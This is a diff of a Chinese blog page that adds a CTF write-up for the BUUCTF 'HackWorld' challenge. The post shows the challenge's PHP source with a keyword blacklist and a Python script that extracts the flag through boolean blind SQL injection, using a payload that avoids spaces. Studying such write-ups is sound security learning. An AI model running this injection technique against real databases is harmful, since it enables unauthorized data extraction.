@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>Tag: 博客搭建 | 大周&#39;blog</title>
+  <title>CISCN2019华北赛区Day2-HackWorld | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -219,64 +219,183 @@
   </div>
 </header>
 
-      
+      <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
 <div class="pattern-center-blank"></div>
-<div class="pattern-center ">
-  <div class="pattern-attachment-img">
-    <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="博客搭建.img" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
-  </div>
-  <header class="pattern-header ">
-    <h1 class="cat-title">博客搭建</h1>
-  </header>
-</div>
+
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
+        
+          <header class="entry-header">
+            <h1 class="entry-title">CISCN2019华北赛区Day2-HackWorld</h1>
+            <p class="entry-census">&nbsp;·&nbsp;2020-6-19&nbsp;
+              
+                    
+        ·<span id="readcount"></span>次阅读
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
+            </p>
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p>
+<a id="more"></a>
+
+<p>打开题目</p>
+<p><img src="/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/1.png" alt="1"></p>
+<p>结合提示，是个sql注入类型的题目，尝试注入测试</p>
+<p>输入单个字母的话提示bool(false)，输入1提示Hello, glzjin wants a girlfriend.  输入2提示Do you want to be my girlfriend?其他数字则是Error Occured When Fetch Result.</p>
+<p>能猜出来是布尔盲注了，而且这里还有过滤，可以用burpsuit来fuzz一下，这里贴出来源代码吧</p>
+<pre><code class="php">&lt;?php
+$dbuser=&#39;root&#39;;
+$dbpass=&#39;root&#39;;
+
+function safe($sql){
+    #被过滤的内容 函数基本没过滤
+    $blackList = array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;`&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;./&#39;);
+    foreach($blackList as $blackitem){
+        if(stripos($sql,$blackitem)){
+            return False;
+        }
+    }
+    return True;
+}
+if(isset($_POST[&#39;id&#39;])){
+    $id = $_POST[&#39;id&#39;];
+}else{
+    die();
+}
+$db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);
+if(!$db){
+    die(mysql_error());
+}   
+mysql_select_db(&quot;ctf&quot;,$db);
+
+if(safe($id)){
+    $query = mysql_query(&quot;SELECT content from passage WHERE id = ${id} limit 0,1&quot;);
+
+    if($query){
+        $result = mysql_fetch_array($query);
+
+        if($result){
+            echo $result[&#39;content&#39;];
+        }else{
+            echo &quot;Error Occured When Fetch Result.&quot;;
+        }
+    }else{
+        var_dump($query);
+    }
+}else{
+    die(&quot;SQL Injection Checked.&quot;);
+}</code></pre>
+<p>可以看到过滤了空格等很多东西，但是也有很多东西没过滤</p>
+<p>因为我能力有限，还是研究师傅们的代码吧</p>
+<pre><code class="python">import requests
+import base64
+import sys
+import string
+import hashlib
+import io
+import time
+
+sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)        #改变标准输出的默认编码,否则s.text不能输出
+x = string.printable
+flag = &quot;&quot;
+url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;
+payload={
+    &quot;id&quot; : &quot;&quot;
+}
+for i in range(0,60):
+    for j in x:
+        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;%(str(i),ord(j))
+        s = requests.post(url,data=payload)
+        #print(s.text)
+        if &quot;Hello&quot; in s.text:
+            flag += j
+            print(flag)
+            break
+
+print(flag)</code></pre>
+<p>但是这个代码我运行的时候报错，所以删掉了<code>sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)</code></p>
+<p>能够正常运行，得到flag</p>
+
         </div>
-        <img width="150" height="150" src="" onerror="imgError(this,3)" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/">
-    hexo博客添加文章访问密码</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2020-5-7</div>
-    <p>
-    </p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
+        <!-- .entry-content -->
+        
+        <p></p>
+          
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/" rel="next">
+              <div class="background">
+                
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/6f005cbc1865ff1b706aba57347988ab.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                强网杯2019-高明的黑客</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "x4KiIidzwmgCbhqx0TEtQk6W-gzGzoHsz",
+        appKey: "uavnoTMwgQJ0F9RrFiIxxgID",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-
-      <div class="clearer">
-      </div>
-    </main>
-    <!--  -->
-    
-  </div>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author"></a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
     </div>    
     <div class="ins-search">
     <div class="ins-search-mask"></div>
